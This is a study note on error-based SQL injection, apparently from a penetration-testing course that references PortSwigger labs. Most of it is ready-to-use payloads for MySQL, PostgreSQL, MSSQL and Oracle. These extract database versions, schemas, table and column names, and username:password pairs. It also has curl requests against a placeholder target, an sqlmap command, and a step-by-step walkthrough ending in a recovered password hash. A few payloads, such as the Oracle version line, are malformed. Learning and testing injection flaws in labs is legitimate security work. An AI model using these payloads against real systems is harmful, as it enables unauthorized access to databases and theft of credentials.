---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.03 Error-Based SQLi"
portswigger_labs: "SQL injection"
---

# 06.03 — Error-Based SQLi

## What is Error-Based SQLi?

Error-based SQLi extracts data by causing the database to include actual data values inside error messages. The error message is returned in the HTTP response, allowing the attacker to read the data directly from the error.

```
NORMAL QUERY:
  SELECT * FROM users WHERE id = 1

INJECTED:
  SELECT * FROM users WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--

DATABASE THROWS ERROR:
  XPATH syntax error: '~root@localhost'
                       ↑
                  This is the database username! Extracted via error!
```

---

## MySQL Error-Based Payloads

### EXTRACTVALUE()

```sql
-- EXTRACT DB VERSION:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--

-- EXTRACT CURRENT DATABASE:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--

-- EXTRACT CURRENT USER:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user())))--

-- EXTRACT ALL DATABASES:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))--

-- EXTRACT TABLES:
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--

-- EXTRACT COLUMNS (from table 'users'):
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users')))--

-- EXTRACT DATA (username:password from users):
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT CONCAT(username,':',password) FROM users LIMIT 1)))--

-- MULTIPLE ROWS (use LIMIT X,1 pattern):
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 0,1)))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 1,1)))--
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT username FROM users LIMIT 2,1)))--
```

### UPDATEXML()

```sql
-- ALTERNATIVE TO EXTRACTVALUE:
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1)--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database())), 1)--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user())), 1)--

-- ALL TABLES:
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())), 1)--

-- DATA EXTRACTION:
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1)), 1)--
```

### FLOOR() + RAND()

```sql
-- OLDER MYSQL (works on MySQL < 5.7.18):
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--

-- DATABASE NAME:
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(database(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--
```

---

## MySQL — Truncation Error (32-char limit)

EXTRACTVALUE and UPDATEXML only return 32 characters. If data is longer, use SUBSTRING:

```sql
-- EXTRACTVALUE WITH SUBSTRING TO GET MORE DATA:
-- First 32 chars:
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1), 1, 32)))--
-- Chars 33-64:
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1), 33, 32)))--
```

---

## PostgreSQL Error-Based Payloads

```sql
-- CAST ERROR (PostgreSQL):
-- When you try to cast a non-integer string to integer, PG includes the string in the error!
' AND CAST((SELECT version()) AS INT)--
-- Error: invalid input syntax for type integer: "PostgreSQL 13.4 on x86_64..."

-- EXTRACT DATA:
' AND CAST((SELECT username FROM users LIMIT 1) AS INT)--
-- Error: invalid input syntax for type integer: "admin"

-- ALL TABLES:
' AND CAST((SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public') AS INT)--

-- COLUMN NAMES:
' AND CAST((SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users') AS INT)--

-- DATA:
' AND CAST((SELECT username||':'||password FROM users LIMIT 1) AS INT)--
```

---

## MSSQL Error-Based Payloads

```sql
-- CONVERT ERROR (MSSQL):
' AND CONVERT(INT, (SELECT @@version))--
-- Error: Conversion failed when converting the nvarchar value 'Microsoft SQL Server...' to INT

-- DB NAME:
' AND CONVERT(INT, DB_NAME())--

-- TABLES:
' AND CONVERT(INT, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--

-- COLUMNS:
' AND CONVERT(INT, (SELECT TOP 1 name FROM syscolumns WHERE id=OBJECT_ID('users')))--

-- DATA:
' AND CONVERT(INT, (SELECT TOP 1 username+':'+password FROM users))--

-- USING CAST:
' AND CAST((SELECT @@version) AS INT)--
```

---

## Oracle Error-Based Payloads

```sql
-- ORA-01722 (invalid number):
' AND TO_NUMBER((SELECT user FROM dual))--
-- ORA-01722: invalid number

-- EXTRACT DATA:
' AND 1=TO_NUMBER((SELECT username FROM users WHERE ROWNUM=1))--
-- ORA-01722: invalid number "admin"

-- VERSION:
' AND TO_NUMBER(banner) IS NOT NULL FROM v$version WHERE ROWNUM=1--
```

---

## Common Request Examples

```bash
# MYSQL ERROR-BASED VIA URL PARAM:
curl "https://target.com/product?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database())))--"

# URL-ENCODED (required for special chars):
curl "https://target.com/product?id=1%27%20AND%20EXTRACTVALUE(1%2CCONCAT(0x7e%2C(SELECT%20database())))--"

# VIA POST BODY:
curl -X POST https://target.com/login \
  -d "username=admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- &password=x" \
  -H "Content-Type: application/x-www-form-urlencoded"

# AUTOMATED WITH SQLMAP:
sqlmap -u "https://target.com/product?id=1" --technique=E --dbs
# --technique=E = error-based only
```

---

## Step-by-Step Error-Based Exploitation

```
STEP 1: Confirm injection
  Payload: '
  Expected: SQL syntax error in response

STEP 2: Extract database version
  MySQL:      ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
  PostgreSQL: ' AND CAST((SELECT version()) AS INT)--
  MSSQL:      ' CONVERT(INT, @@version)--

STEP 3: Extract database name
  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--

STEP 4: Extract table names
  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) 
    FROM information_schema.tables WHERE table_schema=database())))--

STEP 5: Extract column names (from table 'users')
  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name) 
    FROM information_schema.columns WHERE table_name='users')))--

STEP 6: Extract data
  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT CONCAT(username,0x3a,password) 
    FROM users LIMIT 1)))--
    
  → Error: ~admin:5f4dcc3b5aa765d61d8327deb882cf99 (= admin:password MD5!)
```

---

## Related Notes
- [[01 - What is SQL Injection]] — SQLi fundamentals
- [[02 - How Databases Work]] — SQL syntax reference
- [[04 - Union-Based SQLi]] — UNION extraction method
- [[15 - MySQL Specific Payloads]] — full MySQL reference
- [[16 - PostgreSQL Specific Payloads]] — full PostgreSQL reference
- [[17 - MSSQL Specific Payloads]] — full MSSQL reference
